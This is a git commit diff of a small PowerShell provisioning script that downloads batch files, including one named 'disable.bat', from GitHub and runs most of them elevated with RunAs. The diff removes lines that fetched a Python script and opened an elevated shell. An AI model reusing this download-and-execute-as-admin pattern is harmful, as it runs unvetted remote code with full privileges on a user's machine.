6b9f071bb45e2ec57f48a6592e99495eb7d97348
FanAPIpipa <156794064+FanAPIpipa@users.noreply.github.com>
2024-01-23 09:04:33 +0300

    Update fgape.ps1

--- fgape.ps1
+++ fgape.ps1
@@ -1,5 +1,4 @@
 $tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
-$info = "тему урока предлагаю объявить" 
 $installPythonBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
 $installPythonBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
 $batFileDisabler = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/disable.bat" 
@@ -10,9 +9,6 @@ $installPythonToolsBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "in
 $batFileUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
 $batFilePath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
 
-$pythonScriptUrl = "https://github.com/FanAPIpipa/pipa/blob/main/animatetext.py"
-$pythonScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "animatetyping.py"
-
 Invoke-WebRequest -Uri $installPythonBatUrl -OutFile $installPythonBatPath
 Invoke-WebRequest -Uri $batFileDisabler -OutFile $batFileDisablerPath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
@@ -21,8 +17,4 @@ Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBat
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
 Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
-Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $pythonScriptPath
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c pip install --yes pyfiglet" -Verb RunAs -Wait
-Add-Type -AssemblyName PresentationCore
-[Windows.Clipboard]::SetText("$PythonScriptPath")
-Start-Process -FilePath "cmd.exe" -ArgumentList "/K" -Verb RunAs
+
